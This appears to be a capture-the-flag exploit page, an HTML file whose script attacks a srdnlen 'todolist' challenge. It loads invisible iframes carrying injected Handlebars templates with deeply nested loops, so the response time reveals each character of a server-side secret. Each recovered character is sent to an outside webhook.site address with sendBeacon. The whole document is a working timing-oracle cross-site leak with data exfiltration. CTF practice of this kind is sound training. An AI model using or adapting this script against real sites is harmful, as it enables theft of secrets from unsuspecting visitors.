<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>.</title></head><body>
<pre id="log"></pre>
<script>
const TARGET       = "https://todolist.challs.srdnlen.it";
const WEBHOOK      = "https://webhook.site/6f885820-07e1-42ec-965b-8042f45342f8";
const START_PREFIX = "srdnlen{";   // ← update this each visit with what you have so far
const CHARSET      = "abcdefghijklmnopqrstuvwxyz_0123456789}";
const ARRLEN       = 11;
const DEPTH        = 7;
const MATCH_MS     = 1500;  // no-match ~300ms, match ~4400ms
const BUDGET       = 54000;

const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
const CLOS = "{{/each}}".repeat(DEPTH);

function ping(msg) {
  document.getElementById("log").textContent += msg + "\n";
  navigator.sendBeacon(`${WEBHOOK}?log=${encodeURIComponent(msg)}`);
}

function makeUrl(pos, ch) {
  const tpl = `{{#if (eq (lookup secret ${pos}) "${ch}")}}${OPEN}X${CLOS}{{/if}}`;
  return TARGET + "/?data=" + encodeURIComponent(`{"arr":${ARR}}`)
       + "&template=" + encodeURIComponent(tpl);
}

function probe(pos, ch) {
  return new Promise(resolve => {
    const f  = document.createElement("iframe");
    f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
    let done = false;
    const t0 = Date.now();
    function finish(slow) {
      if (done) return; done = true;
      clearTimeout(tid);
      try { f.src = "about:blank"; f.remove(); } catch(e) {}
      resolve({ dt: Date.now()-t0, slow });
    }
    const tid = setTimeout(() => finish(true), MATCH_MS);
    f.onload  = () => finish(Date.now()-t0 >= MATCH_MS);
    f.onerror = () => finish(false);
    f.src = makeUrl(pos, ch);
    document.body.appendChild(f);
  });
}

async function run() {
  const t0 = Date.now();
  let flag = START_PREFIX;
  ping(`[start] prefix=${flag}`);

  for (let pos = START_PREFIX.length; pos < 60; pos++) {
    if (Date.now()-t0 > BUDGET) {
      ping(`[budget] stopped at pos=${pos} — resubmit with START_PREFIX="${flag}"`);
      navigator.sendBeacon(`${WEBHOOK}?PARTIAL&flag=${encodeURIComponent(flag)}`);
      break;
    }

    let found = null;
    for (const ch of CHARSET) {
      if (Date.now()-t0 > BUDGET) break;
      const r = await probe(pos, ch);
      if (r.slow) { found = ch; break; }
    }

    if (found) {
      flag += found;
      ping(`[FLAG] ${flag}`);
      navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
      if (found === "}") break;
    } else {
      ping(`[MISS] pos=${pos} — update CHARSET or resubmit`);
      navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
      break;
    }
  }

  const total = Date.now()-t0;
  ping(`[DONE] ${flag}  (${total}ms)`);
  navigator.sendBeacon(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}&ms=${total}`);
}

run();
</script>
</body></html>
